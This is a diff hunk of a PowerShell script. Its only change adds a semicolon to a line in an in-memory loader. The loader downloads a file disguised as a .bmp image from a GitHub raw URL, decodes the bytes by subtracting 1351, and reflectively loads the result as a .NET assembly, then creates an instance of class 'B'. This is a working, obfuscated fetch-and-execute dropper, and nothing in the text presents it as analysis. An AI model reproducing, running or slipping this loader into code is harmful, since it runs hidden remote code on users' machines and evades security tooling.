@@ -67,7 +67,7 @@
 ##############################################################################################################################################################
 ##############################################################################################################################################################
 $la = {
-$L =  (Invoke-WebRequest 'https://raw.githubusercontent.com/FrankCastle2/Dper/main/pictures/3.bmp' -UseBasicParsing).Content
+$L =  (Invoke-WebRequest 'https://raw.githubusercontent.com/FrankCastle2/Dper/main/pictures/3.bmp' -UseBasicParsing).Content;
 For ($i=0; $i -lt $L.Length; $i++) {$L[$i] = [System.BitConverter]::GetBytes($L[$i] - 1351)[0];};
  [System.Reflection.Assembly]::Load((($L))).CreateInstance("B")
 };
